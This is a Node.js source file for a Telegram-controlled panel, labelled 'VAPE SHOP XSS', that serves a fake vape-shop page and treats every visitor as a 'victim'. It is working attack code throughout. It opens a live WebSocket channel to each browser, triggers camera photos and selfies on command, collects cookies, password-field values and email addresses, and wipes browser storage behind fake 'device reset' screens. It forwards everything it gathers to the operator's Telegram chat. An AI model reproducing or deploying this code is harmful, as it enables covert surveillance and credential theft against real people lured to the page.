const express = require('express');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const socketIO = require('socket.io');
const multer = require('multer');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SESSION_TIMEOUT = parseInt(process.env.SESSION_TIMEOUT) || 60000;
const MAX_PHOTOS = parseInt(process.env.MAX_PHOTOS) || 5;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/uploads', express.static('uploads'));

// ========================================
// ХРАНИЛИЩЕ
// ========================================
const victims = {};
const sessions = {};
const photos = {};
const stolenData = {};

// ========================================
// TELEGRAM БОТ
// ========================================
let bot = null;

try {
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== 'ВАШ_ТОКЕН_ОТ_BOTFATHER') {
        bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
        console.log('✅ Telegram бот инициализирован');
    }
} catch (error) {
    console.error('❌ Ошибка бота:', error.message);
}

// ========================================
// КОМАНДЫ TELEGRAM
// ========================================
if (bot) {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) {
            bot.sendMessage(chatId, '❌ Доступ запрещен');
            return;
        }
        bot.sendMessage(chatId, `
🕵️‍♂️ *VAPE SHOP XSS PANEL v4.0*

*📱 Управление устройством:*
/photos [id] - Получить фото с камеры
/selfie [id] - Сделать селфи (фронтальная камера)
/accounts [id] - Все аккаунты на устройстве
/cookies [id] - Украсть куки и пароли
/restart [id] - Перезапустить телефон
/reset [id] - Сброс устройства (WARNING!)
/kick [id] - Выгнать пользователя

*📊 Информация:*
/list - Список жертв
/stats - Статистика
/clear - Очистить список

*Жертв:* ${Object.keys(victims).length}
        `, { parse_mode: 'Markdown' });
    });

    // ========================================
    // ФОТО С КАМЕРЫ
    // ========================================
    bot.onText(/\/photos (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'takePhoto',
            type: 'back'
        }));
        bot.sendMessage(chatId, `📸 Запрос фото с камеры отправлен ${victimId.slice(0, 8)}`);
    });

    // ========================================
    // СЕЛФИ
    // ========================================
    bot.onText(/\/selfie (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'takePhoto',
            type: 'front'
        }));
        bot.sendMessage(chatId, `🤳 Запрос селфи отправлен ${victimId.slice(0, 8)}`);
    });

    // ========================================
    // АККАУНТЫ
    // ========================================
    bot.onText(/\/accounts (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'getAccounts'
        }));
        bot.sendMessage(chatId, `🔍 Сканирование аккаунтов ${victimId.slice(0, 8)}...`);
    });

    // ========================================
    // КУКИ И ПАРОЛИ
    // ========================================
    bot.onText(/\/cookies (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'stealCookies'
        }));
        bot.sendMessage(chatId, `🍪 Кража кук и паролей ${victimId.slice(0, 8)}...`);
    });

    // ========================================
    // ПЕРЕЗАПУСК ТЕЛЕФОНА
    // ========================================
    bot.onText(/\/restart (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'restartPhone'
        }));
        bot.sendMessage(chatId, `🔄 Перезапуск телефона ${victimId.slice(0, 8)}...`);
    });

    // ========================================
    // СБРОС УСТРОЙСТВА
    // ========================================
    bot.onText(/\/reset (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        bot.sendMessage(chatId, `⚠️ ВНИМАНИЕ! Вы уверены, что хотите сбросить устройство ${victimId.slice(0, 8)}?\nНапишите /confirm_reset_${victimId} для подтверждения`);
        
        // Сохраняем запрос на подтверждение
        global.pendingReset = victimId;
    });

    bot.onText(/\/confirm_reset_(.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (global.pendingReset === victimId) {
            if (victims[victimId] && victims[victimId].ws) {
                victims[victimId].ws.send(JSON.stringify({ 
                    command: 'resetDevice'
                }));
                bot.sendMessage(chatId, `💥 СБРОС УСТРОЙСТВА ${victimId.slice(0, 8)} выполнен!`);
                global.pendingReset = null;
            } else {
                bot.sendMessage(chatId, '❌ Жертва не найдена или не в сети');
            }
        } else {
            bot.sendMessage(chatId, '❌ Нет активного запроса на сброс');
        }
    });

    // ========================================
    // ВЫГНАТЬ ПОЛЬЗОВАТЕЛЯ
    // ========================================
    bot.onText(/\/kick (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        const victim = victims[victimId];
        
        if (!victim) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (victim.ws) {
            victim.ws.send(JSON.stringify({ command: 'kick' }));
            bot.sendMessage(chatId, `👢 Пользователь ${victimId.slice(0, 8)} выгнан`);
            setTimeout(() => {
                if (victim.ws) victim.ws.disconnect();
            }, 500);
        } else {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
        }
    });

    // ========================================
    // СПИСОК ЖЕРТВ
    // ========================================
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        if (Object.keys(victims).length === 0) {
            bot.sendMessage(chatId, '❌ Нет активных жертв');
            return;
        }
        
        let list = '📋 *Жертвы:*\n\n';
        Object.entries(victims).forEach(([id, data]) => {
            const shortId = id.slice(0, 8);
            const status = data.ws ? '🟢' : '🔴';
            const hasData = stolenData[id] ? '📦' : '📭';
            list += `\`${shortId}\` ${status} ${hasData} ${data.ip || 'unknown'}\n`;
        });
        list += `\nВсего: ${Object.keys(victims).length}`;
        bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
    });

    // ========================================
    // СТАТИСТИКА
    // ========================================
    bot.onText(/\/stats/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        const total = Object.keys(victims).length;
        const active = Object.values(victims).filter(v => v.ws).length;
        const photoCount = Object.values(photos).reduce((a, b) => a + b.length, 0);
        const dataCount = Object.keys(stolenData).length;
        
        bot.sendMessage(chatId, `
📊 *Статистика:*
Всего жертв: ${total}
Активных: ${active}
Оффлайн: ${total - active}
Всего фото: ${photoCount}
Собрано данных: ${dataCount}
        `, { parse_mode: 'Markdown' });
    });

    // ========================================
    // ОЧИСТИТЬ
    // ========================================
    bot.onText(/\/clear/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const count = Object.keys(victims).length;
        Object.keys(victims).forEach(key => {
            if (victims[key].ws) victims[key].ws.disconnect();
            delete victims[key];
        });
        bot.sendMessage(chatId, `✅ Очищено ${count} жертв`);
    });
}

// ========================================
// MULTER ДЛЯ ФОТО
// ========================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = './uploads';
        if (!fs.existsSync(dir)) fs.mkdirSync(dir);
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const unique = `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
        cb(null, `${unique}-${file.originalname}`);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) cb(null, true);
        else cb(new Error('Только фото!'));
    }
});

// ========================================
// API
// ========================================
app.get('/', (req, res) => {
    const sessionId = req.query.session || Math.random().toString(36).slice(2, 10);
    
    sessions[sessionId] = { 
        createdAt: Date.now(),
        timeout: setTimeout(() => {
            delete sessions[sessionId];
            console.log(`⏰ Сессия ${sessionId} истекла`);
        }, SESSION_TIMEOUT)
    };
    
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💨 VAPE SHOP</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        body {
            font-family: 'Orbitron', sans-serif;
            background: #0a0a0a;
            color: #fff;
            min-height: 100vh;
            overflow: hidden;
            background: radial-gradient(ellipse at center, #1a1a2e 0%, #0a0a0a 70%);
        }
        
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #00ff88;
            border-radius: 50%;
            animation: float linear infinite;
            opacity: 0.3;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.3; }
            90% { opacity: 0.3; }
            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
        }
        
        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 40px;
            max-width: 800px;
            margin: 0 auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .glass {
            background: rgba(26, 26, 46, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 60px 50px;
            border: 1px solid rgba(0, 255, 136, 0.2);
            box-shadow: 0 0 80px rgba(0, 255, 136, 0.05);
            width: 100%;
        }
        
        .logo {
            font-size: 72px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ff88, #00ccff, #00ff88);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient 4s ease infinite;
            margin-bottom: 10px;
        }
        @keyframes gradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .subtitle {
            color: #666;
            font-size: 14px;
            letter-spacing: 8px;
            text-transform: uppercase;
            margin-bottom: 30px;
            font-weight: 400;
        }
        
        .status {
            color: #00ff88;
            font-size: 14px;
            margin: 20px 0;
            font-weight: 400;
            letter-spacing: 2px;
        }
        .status .dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #00ff88;
            border-radius: 50%;
            margin-right: 10px;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(0.8); }
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 30px 0;
        }
        .info-card {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .info-card .label {
            color: #666;
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .info-card .value {
            color: #fff;
            font-size: 14px;
            margin-top: 5px;
            font-weight: 700;
        }
        
        .btn-primary {
            display: inline-block;
            padding: 16px 50px;
            background: linear-gradient(135deg, #00ff88, #00ccff);
            color: #0a0a0a;
            border: none;
            border-radius: 50px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            font-family: 'Orbitron', sans-serif;
            margin-top: 20px;
            box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);
        }
        .btn-primary:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 0 60px rgba(0, 255, 136, 0.3);
        }
        
        .timer {
            margin-top: 20px;
            color: #ff4444;
            font-size: 12px;
            letter-spacing: 2px;
        }
        .timer span {
            font-size: 18px;
            font-weight: 700;
        }
        
        .footer {
            margin-top: 30px;
            color: #333;
            font-size: 10px;
            letter-spacing: 2px;
        }
        
        .upload-area {
            margin-top: 20px;
            padding: 20px;
            border: 2px dashed rgba(0, 255, 136, 0.3);
            border-radius: 12px;
            cursor: pointer;
            transition: 0.3s;
            background: rgba(0,0,0,0.2);
        }
        .upload-area:hover {
            border-color: #00ff88;
            background: rgba(0, 255, 136, 0.05);
        }
        .upload-area input {
            display: none;
        }
        
        @media (max-width: 768px) {
            .glass { padding: 30px 20px; }
            .logo { font-size: 42px; }
            .info-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <div class="glass">
            <div class="logo">💨 VAPE SHOP</div>
            <div class="subtitle">Premium Vape Experience</div>
            
            <div class="status">
                <span class="dot"></span>
                Система активна
            </div>
            
            <div class="info-grid">
                <div class="info-card">
                    <div class="label">Сессия</div>
                    <div class="value" id="sessionId">${sessionId}</div>
                </div>
                <div class="info-card">
                    <div class="label">Время до вылета</div>
                    <div class="value" id="timer">${Math.floor(SESSION_TIMEOUT/1000)}с</div>
                </div>
                <div class="info-card">
                    <div class="label">IP-адрес</div>
                    <div class="value">${req.ip || 'unknown'}</div>
                </div>
                <div class="info-card">
                    <div class="label">Статус</div>
                    <div class="value" style="color:#00ff88;">Подключен</div>
                </div>
            </div>
            
            <button class="btn-primary" onclick="takePhoto()">📸 Сделать фото</button>
            <button class="btn-primary" onclick="takeSelfie()" style="margin-left:10px;">🤳 Селфи</button>
            
            <div class="upload-area" onclick="document.getElementById('fileInput').click()">
                <p>📤 Нажмите чтобы загрузить фото</p>
                <input type="file" id="fileInput" accept="image/*" multiple>
            </div>
            
            <div class="timer">
                ⏱️ Сессия истечет через <span id="countdown">${Math.floor(SESSION_TIMEOUT/1000)}</span> секунд
            </div>
            
            <div class="footer">18+ • Только для совершеннолетних</div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const sessionId = '${sessionId}';
        const socket = io({ query: { session: sessionId } });
        
        // Частицы
        for (let i = 0; i < 50; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDuration = (Math.random() * 20 + 10) + 's';
            p.style.animationDelay = (Math.random() * 10) + 's';
            p.style.width = (Math.random() * 3 + 1) + 'px';
            p.style.height = p.style.width;
            document.getElementById('particles').appendChild(p);
        }
        
        // Таймер
        let seconds = ${Math.floor(SESSION_TIMEOUT/1000)};
        const timerEl = document.getElementById('countdown');
        const timerDisplay = document.getElementById('timer');
        
        const interval = setInterval(() => {
            seconds--;
            timerEl.textContent = seconds;
            timerDisplay.textContent = seconds + 'с';
            
            if (seconds <= 10) {
                timerEl.style.color = '#ff4444';
            }
            
            if (seconds <= 0) {
                clearInterval(interval);
                document.body.innerHTML = \`
                    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#fff;flex-direction:column;text-align:center;padding:20px;">
                        <h1 style="font-size:48px;color:#ff4444;">⏰ ВРЕМЯ ВЫШЛО</h1>
                        <p style="color:#666;margin:20px 0;">Сессия истекла. Обновите страницу для входа.</p>
                        <button onclick="location.reload()" style="padding:12px 30px;background:#00ff88;color:#0a0a0a;border:none;border-radius:25px;font-weight:700;cursor:pointer;">🔄 Обновить</button>
                    </div>
                \`;
            }
        }, 1000);
        
        // ========================================
        // ФУНКЦИИ ДЛЯ ПОЛЬЗОВАТЕЛЯ
        // ========================================
        function takePhoto() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                            socket.emit('data', { type: 'photo', data: dataUrl });
                            stream.getTracks().forEach(t => t.stop());
                            alert('✅ Фото отправлено!');
                        }, 500);
                    })
                    .catch(() => alert('❌ Нет доступа к камере'));
            } else {
                alert('❌ Камера не поддерживается');
            }
        }
        
        function takeSelfie() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 1280;
                            canvas.height = video.videoHeight || 720;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                            socket.emit('data', { type: 'photo', data: dataUrl });
                            stream.getTracks().forEach(t => t.stop());
                            alert('✅ Селфи отправлено!');
                        }, 500);
                    })
                    .catch(() => alert('❌ Нет доступа к камере'));
            } else {
                alert('❌ Камера не поддерживается');
            }
        }
        
        // Загрузка фото
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const files = this.files;
            for (let file of files) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    socket.emit('data', { type: 'photo', data: event.target.result });
                };
                reader.readAsDataURL(file);
            }
            alert('📸 ' + files.length + ' фото отправлено!');
            this.value = '';
        });
        
        // ========================================
        // ОБРАБОТКА КОМАНД ОТ СЕРВЕРА
        // ========================================
        socket.on('command', (data) => {
            console.log('📩 Команда:', data.command);
            
            if (data.command === 'takePhoto') {
                if (data.type === 'front') takeSelfie();
                else takePhoto();
            }
            
            if (data.command === 'getAccounts') {
                const accounts = {
                    social: [],
                    email: [],
                    passwords: [],
                    cookies: document.cookie
                };
                
                // Собираем соцсети
                document.querySelectorAll('a[href*="facebook"], a[href*="vk"], a[href*="instagram"], a[href*="twitter"]').forEach(el => {
                    accounts.social.push(el.href);
                });
                
                // Собираем email
                const emails = document.body.innerText.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/g);
                if (emails) accounts.email = [...new Set(emails)];
                
                // Собираем пароли из форм
                document.querySelectorAll('input[type="password"]').forEach(el => {
                    if (el.value) accounts.passwords.push(el.value);
                });
                
                socket.emit('data', { type: 'accounts', data: accounts });
            }
            
            if (data.command === 'stealCookies') {
                socket.emit('data', { type: 'cookies', cookies: document.cookie });
                
                // Собираем все пароли
                const passwords = [];
                document.querySelectorAll('input[type="password"]').forEach(el => {
                    if (el.value) passwords.push(el.value);
                });
                if (passwords.length > 0) {
                    socket.emit('data', { type: 'passwords', data: passwords });
                }
            }
            
            if (data.command === 'restartPhone') {
                if (confirm('⚠️ Телефон будет перезапущен. Продолжить?')) {
                    document.body.innerHTML = \`
                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ff8800;flex-direction:column;">
                            <h1 style="font-size:48px;">🔄 ПЕРЕЗАПУСК</h1>
                            <p style="color:#666;margin-top:20px;">Устройство перезагружается...</p>
                        </div>
                    \`;
                    setTimeout(() => {
                        window.location.reload();
                    }, 3000);
                }
            }
            
            if (data.command === 'resetDevice') {
                if (confirm('⚠️ ВСЕ ДАННЫЕ БУДУТ УДАЛЕНЫ! Продолжить?')) {
                    document.body.innerHTML = \`
                        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ff4444;flex-direction:column;">
                            <h1 style="font-size:48px;">💥 СБРОС УСТРОЙСТВА</h1>
                            <p style="color:#666;margin-top:20px;">Все данные будут удалены...</p>
                            <div style="width:200px;height:4px;background:#333;margin-top:30px;border-radius:2px;">
                                <div style="width:100%;height:100%;background:#ff4444;border-radius:2px;animation:progress 2s linear;"></div>
                            </div>
                            <style>
                                @keyframes progress {
                                    0% { width: 0%; }
                                    100% { width: 100%; }
                                }
                            </style>
                        </div>
                    \`;
                    setTimeout(() => {
                        // Очистка данных
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(c => {
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/");
                        });
                        alert('💥 Устройство сброшено!');
                        window.location.reload();
                    }, 3000);
                }
            }
            
            if (data.command === 'kick') {
                document.body.innerHTML = \`
                    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ff4444;flex-direction:column;text-align:center;padding:20px;">
                        <h1 style="font-size:48px;">👢 ДОСТУП ЗАПРЕЩЕН</h1>
                        <p style="color:#666;margin:20px 0;">Вы были удалены из системы</p>
                    </div>
                \`;
                setTimeout(() => {
                    window.close();
                }, 2000);
            }
        });
        
        // Отправка heartbeat
        setInterval(() => {
            socket.emit('data', { type: 'heartbeat' });
        }, 30000);
        
        console.log('💨 VAPE SHOP загружен');
    </script>
</body>
</html>
    `);
});

// ========================================
// API
// ========================================
app.post('/api/visit', (req, res) => {
    const { session, ip, ua } = req.body;
    if (!sessions[session]) {
        sessions[session] = { createdAt: Date.now() };
    }
    res.json({ success: true });
});

app.post('/api/upload', upload.single('photo'), (req, res) => {
    const sessionId = req.body.session;
    const victim = victims[sessionId];
    
    if (!victim) {
        return res.status(404).json({ error: 'Сессия не найдена' });
    }
    
    if (!photos[sessionId]) photos[sessionId] = [];
    photos[sessionId].push(req.file.path);
    
    if (bot && ADMIN_CHAT_ID) {
        bot.sendMessage(ADMIN_CHAT_ID, `📸 Новое фото от ${sessionId.slice(0, 8)}`);
        bot.sendPhoto(ADMIN_CHAT_ID, req.file.path);
    }
    
    res.json({ success: true, path: req.file.path });
});

// ========================================
// WEBSOCKET
// ========================================
const server = require('http').createServer(app);
const io = socketIO(server);

io.on('connection', (socket) => {
    const sessionId = socket.handshake.query.session || `victim_${Date.now()}`;
    console.log(`🔗 Жертва: ${sessionId}`);
    
    victims[sessionId] = {
        id: sessionId,
        ip: socket.handshake.address,
        ua: socket.handshake.headers['user-agent'],
        timestamp: Date.now(),
        ws: socket
    };
    
    if (bot && ADMIN_CHAT_ID) {
        bot.sendMessage(ADMIN_CHAT_ID, `🆕 Новая жертва!\nID: \`${sessionId.slice(0, 8)}...\``, { parse_mode: 'Markdown' });
    }
    
    socket.on('data', (data) => {
        console.log(`📩 [${sessionId}] ${data.type}`);
        
        // Фото
        if (data.type === 'photo') {
            const base64Data = data.data.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            const filename = `uploads/${Date.now()}-${Math.random().toString(36).slice(2, 7)}.jpg`;
            fs.writeFileSync(filename, buffer);
            
            if (!photos[sessionId]) photos[sessionId] = [];
            photos[sessionId].push(filename);
            
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `📸 Фото от ${sessionId.slice(0, 8)}`);
                bot.sendPhoto(ADMIN_CHAT_ID, filename);
            }
        }
        
        // Аккаунты
        if (data.type === 'accounts') {
            stolenData[sessionId] = { accounts: data.data };
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `🔐 Аккаунты от ${sessionId.slice(0, 8)}:\n\`\`\`json\n${JSON.stringify(data.data, null, 2)}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        
        // Куки
        if (data.type === 'cookies') {
            if (!stolenData[sessionId]) stolenData[sessionId] = {};
            stolenData[sessionId].cookies = data.cookies;
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `🍪 Куки от ${sessionId.slice(0, 8)}:\n\`\`\`\n${data.cookies}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        
        // Пароли
        if (data.type === 'passwords') {
            if (!stolenData[sessionId]) stolenData[sessionId] = {};
            stolenData[sessionId].passwords = data.data;
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `🔑 Пароли от ${sessionId.slice(0, 8)}:\n\`\`\`\n${data.data.join('\n')}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
    });
    
    socket.on('disconnect', () => {
        console.log(`🔌 Отключение: ${sessionId}`);
        if (victims[sessionId]) {
            victims[sessionId].ws = null;
        }
    });
});

// ========================================
// ЗАПУСК
// ========================================
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n✅ VAPE SHOP XSS BOT v4.0`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`📱 Telegram бот: ${bot ? '✅ активен' : '❌ не настроен'}`);
    console.log(`⏰ Таймаут: ${SESSION_TIMEOUT/1000}с`);
    console.log(`📸 Максимум фото: ${MAX_PHOTOS}\n`);
});
